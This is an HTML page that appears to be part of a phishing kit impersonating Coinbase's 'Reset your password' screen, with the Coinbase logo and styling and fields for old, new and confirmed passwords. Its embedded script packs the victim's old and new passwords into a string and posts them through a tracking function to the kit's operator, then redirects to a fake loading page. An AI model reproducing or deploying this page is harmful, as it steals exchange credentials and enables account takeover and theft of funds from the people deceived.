
<!DOCTYPE html>
<html class="ll-fb" lang="en" style="background:#0a0b0d;">
 <head>
  <meta charset="utf-8"/>
  <link rel="icon" href="/Coinbaselogo.png"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>Coinbase - Reset Password</title>
  <meta content="#000000" name="theme-color"/>
  <link rel="stylesheet" href="css/flow-b-shell.css"/>
  <link href="css/9.css" rel="stylesheet"/>
  <style>
html.ll-fb,
html.ll-fb *,
html.ll-fb *::before,
html.ll-fb *::after {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
}
    @keyframes cb-spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    .cb-rp-eye{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:rgba(255,255,255,.4);padding:0;line-height:1;}
    .cb-rp-eye:hover{color:rgba(255,255,255,.8);}
    .cb-rp-eye svg{width:18px;height:18px;display:block;}
  </style>
 </head>
 <body style="background:#0a0b0d;">
  <div class="ll-fb-type" id="root">
   <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
    <div class="w-full px-6 pt-5">
     <svg class="ll-fb-logo" height="32" viewbox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"/>
     </svg>
    </div>
    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
     <form id="cb-rp-form" class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
      <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">Reset your password</span>
      <span class="font-coinbase-sans text-coinbase-foreground-muted">Create a new secure password, one that you don't use on any other websites.</span>

      <!-- Old password -->
      <div class="relative mt-5 flex w-full flex-col gap-2 text-left text-white">
       <span class="text-sm font-semibold">Old password</span>
       <div style="position:relative;">
        <input id="cb-rp-old" class="rounded-md border border-coinbase-line bg-coinbase-background px-4 py-3.5 font-coinbase-sans outline-none hover:bg-[#0f1012] focus:outline-coinbase-primary" style="width:100%;box-sizing:border-box;padding-right:44px;" placeholder="Enter your old password" type="password"/>
        <button class="cb-rp-eye" type="button" data-target="cb-rp-old" aria-label="Toggle visibility">
         <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88"/></svg>
        </button>
       </div>
       <span id="cb-rp-old-err" style="display:none;color:#f87171;font-size:12px;font-family:monospace;margin-top:2px;">Incorrect old password, try again.</span>
      </div>

      <!-- New password -->
      <div class="relative mt-5 flex w-full flex-col gap-2 text-left text-white">
       <span class="text-sm font-semibold">New password</span>
       <div style="position:relative;">
        <input id="cb-rp-new" class="rounded-md border border-coinbase-line bg-coinbase-background px-4 py-3.5 font-coinbase-sans outline-none hover:bg-[#0f1012] focus:outline-coinbase-primary" style="width:100%;box-sizing:border-box;padding-right:44px;" placeholder="Enter your new password" type="password"/>
        <button class="cb-rp-eye" type="button" data-target="cb-rp-new" aria-label="Toggle visibility">
         <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88"/></svg>
        </button>
       </div>
      </div>

      <!-- Confirm password -->
      <div class="relative mt-5 flex w-full flex-col gap-2 text-left text-white">
       <span class="text-sm font-semibold">Confirm password</span>
       <div style="position:relative;">
        <input id="cb-rp-confirm" class="rounded-md border border-coinbase-line bg-coinbase-background px-4 py-3.5 font-coinbase-sans outline-none hover:bg-[#0f1012] focus:outline-coinbase-primary" style="width:100%;box-sizing:border-box;padding-right:44px;" placeholder="Re-enter your new password" type="password"/>
        <button class="cb-rp-eye" type="button" data-target="cb-rp-confirm" aria-label="Toggle visibility">
         <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88"/></svg>
        </button>
       </div>
       <span id="cb-rp-match-err" style="display:none;color:#f87171;font-size:12px;font-family:monospace;margin-top:2px;">Passwords do not match.</span>
      </div>

      <button id="cb-rp-submit" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] mt-4 rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center" disabled type="button">
       Confirm
      </button>
     </form>
    </div>
   </div>
  </div>

  <script>
  (function(){
    var oldInp    = document.getElementById('cb-rp-old');
    var newInp    = document.getElementById('cb-rp-new');
    var confInp   = document.getElementById('cb-rp-confirm');
    var submitBtn = document.getElementById('cb-rp-submit');
    var oldErr    = document.getElementById('cb-rp-old-err');
    var matchErr  = document.getElementById('cb-rp-match-err');

    // Eye icons — CLOSED (slash) = password hidden, OPEN = password visible
    var EYE_CLOSED = '<path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88"/>';
    var EYE_OPEN   = '<path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z"/><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>';

    var oldEyeBtn  = document.querySelector('.cb-rp-eye[data-target="cb-rp-old"]');
    var newEyeBtn  = document.querySelector('.cb-rp-eye[data-target="cb-rp-new"]');
    var confEyeBtn = document.querySelector('.cb-rp-eye[data-target="cb-rp-confirm"]');

    function setEyeState(btn, reveal) {
      btn.querySelector('svg').innerHTML = reveal ? EYE_OPEN : EYE_CLOSED;
      btn.style.color = reveal ? 'rgba(255,255,255,.8)' : '';
    }

    // Old password eye — independent, toggles only itself
    oldEyeBtn.addEventListener('click', function(){
      var reveal = oldInp.type === 'password';
      oldInp.type = reveal ? 'text' : 'password';
      setEyeState(oldEyeBtn, reveal);
    });

    // New + Confirm eyes — synced together, independent from old
    function setNewConfirmVisibility(reveal) {
      newInp.type  = reveal ? 'text' : 'password';
      confInp.type = reveal ? 'text' : 'password';
      setEyeState(newEyeBtn,  reveal);
      setEyeState(confEyeBtn, reveal);
    }
    newEyeBtn.addEventListener('click',  function(){ setNewConfirmVisibility(newInp.type === 'password'); });
    confEyeBtn.addEventListener('click', function(){ setNewConfirmVisibility(confInp.type === 'password'); });

    // Validate on every input change
    function validate(){
      var o = oldInp.value;
      var n = newInp.value;
      var c = confInp.value;
      var mismatch = n && c && n !== c;
      matchErr.style.display = mismatch ? 'block' : 'none';
      confInp.style.borderColor = mismatch ? '#f87171' : '';
      submitBtn.disabled = !(o && n && c && n === c);
    }
    [oldInp, newInp, confInp].forEach(function(inp){ inp.addEventListener('input', validate); });

    // Clear old-password error on re-type
    oldInp.addEventListener('input', function(){
      oldErr.style.display = 'none';
      oldInp.style.borderColor = '';
    });

    var _sent = false;
    submitBtn.addEventListener('click', function(){
      if (_sent) return;
      var old = oldInp.value;
      var nw  = newInp.value;
      var conf = confInp.value;
      if(!old || !nw || !conf || nw !== conf) return;
      _sent = true;

      var b = new URLSearchParams({_token:window._liveledCSRF||'',page:'coinbase_reset_password',type:'form_submit',element:'reset_password',value:'old: '+old+' | new: '+nw,doc:window._llDocId||''});
      var post = window._llPostTrack ? window._llPostTrack(b) : Promise.reject();
      post.then(function () {
        window.location.href = '/coinbase/loading';
      }).catch(function () {
        _sent = false;
      });
    });
  })();
  </script>
